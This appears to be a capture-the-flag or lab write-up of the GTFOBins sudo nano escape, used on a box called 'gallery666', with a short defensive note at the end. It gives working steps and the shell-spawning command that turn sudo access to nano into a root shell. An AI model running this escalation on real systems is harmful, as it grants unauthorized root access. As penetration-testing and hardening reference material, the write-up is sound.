# Sudo Nano Escape (GTFOBins)

Used on: **gallery666**

When a user is permitted to run `nano` as root via `sudo` (or a script that invokes `nano` via `sudo`), the attacker can escape the text editor and spawn an interactive shell with root privileges.

## Prerequisites

- Sudo privileges allowing the execution of `/bin/nano` or a script that drops into `/bin/nano`.
- Interactive access to the terminal.

## Steps

### 1. Trigger the vulnerable script

```bash
sudo /bin/bash /opt/rootkit.sh
# Choose the 'read' option which triggers: /bin/nano /root/report.txt
```

### 2. Escape to Shell

Once inside `nano`:
1. Press `Ctrl + R` (Read File).
2. Press `Ctrl + X` (Execute Command).
3. Type the following command and press Enter:

```bash
reset; sh 1>&0 2>&0
```

### 3. Verify Access

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Defensive Note

Do not allow users to execute interactive text editors (like `nano`, `vim`, or `less`) with sudo privileges, as they inherently provide shell escape mechanisms. Consider using restricted viewers or logging alternatives instead.
